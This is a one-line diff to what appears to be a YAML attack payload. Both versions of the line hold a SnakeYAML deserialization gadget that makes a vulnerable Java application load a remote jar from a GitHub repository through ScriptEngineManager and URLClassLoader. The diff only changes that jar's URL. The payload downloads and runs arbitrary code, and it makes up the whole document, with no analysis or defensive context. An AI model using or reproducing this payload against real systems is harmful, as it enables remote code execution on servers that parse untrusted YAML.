@@ -1,1 +1,1 @@
-!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["https://github.com/coloristlife/temp/raw/main/test.jar"] ]] ]
+!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["https://raw.githubusercontent.com/coloristlife/temp/main/test.jar"] ]] ]
